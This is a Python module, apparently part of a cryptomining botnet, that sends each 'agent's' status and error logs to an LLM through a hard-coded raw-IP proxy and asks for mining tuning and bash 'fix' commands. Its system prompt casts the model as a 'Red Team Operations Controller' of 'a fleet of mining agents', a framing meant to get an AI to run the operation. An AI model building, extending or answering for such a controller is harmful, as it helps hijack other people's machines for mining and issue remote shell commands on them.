import requests
import json
import platform
import subprocess
import os

# CONFIG
PROXY_URL = "http://45.32.137.220:5555/v1/chat/completions"

class AIInterface:
    def __init__(self, system_id):
        self.system_id = system_id
    
    def report_status(self, status_data):
        """
        Report system status to the AI and ask for optimization advice.
        """
        prompt = f"""
        I am Agent {self.system_id}.
        My current status is:
        {json.dumps(status_data, indent=2)}
        
        Analyze my status. 
        1. Are there any errors?
        2. Is my CPU usage optimized for mining (should be high but not crashing)?
        3. Do you recommend any configuration changes?
        
        Respond in JSON format: {{ "status": "ok", "commands": [] }}
        """
        
        return self._send_request(prompt)

    def troubleshoot(self, error_log):
        """
        Send an error log to the AI and get a fix command.
        """
        prompt = f"""
        I am Agent {self.system_id}.
        I encountered an error:
        {error_log}
        
        Provide a bash command to fix this issue.
        Respond in JSON format: {{ "fix_command": "..." }}
        """
        return self._send_request(prompt)

    def _send_request(self, prompt):
        headers = {
            "Content-Type": "application/json",
            "Authorization": "Bearer sk-proxy-key" 
        }
        
        data = {
            "model": "gpt-4",
            "messages": [
                {"role": "system", "content": "You are a Red Team Operations Controller. You manage a fleet of mining agents."},
                {"role": "user", "content": prompt}
            ]
        }
        
        try:
            response = requests.post(PROXY_URL, headers=headers, json=data, timeout=30)
            if response.status_code == 200:
                result = response.json()
                content = result['choices'][0]['message']['content']
                try:
                    # Clean markdown code blocks if present
                    if "```" in content:
                        content = content.split("```json")[-1].split("```")[0].strip()
                        if "{" not in content: # If it wasn't json block
                             content = content.split("```")[-1].split("```")[0].strip()
                    
                    # Find JSON object
                    start = content.find("{")
                    end = content.rfind("}")
                    if start != -1 and end != -1:
                        content = content[start:end+1]
                        return json.loads(content)
                    else:
                        return {"raw_response": content}
                except:
                    return {"raw_response": content}
            else:
                return {"error": f"HTTP {response.status_code}"}
        except Exception as e:
            return {"error": str(e)}
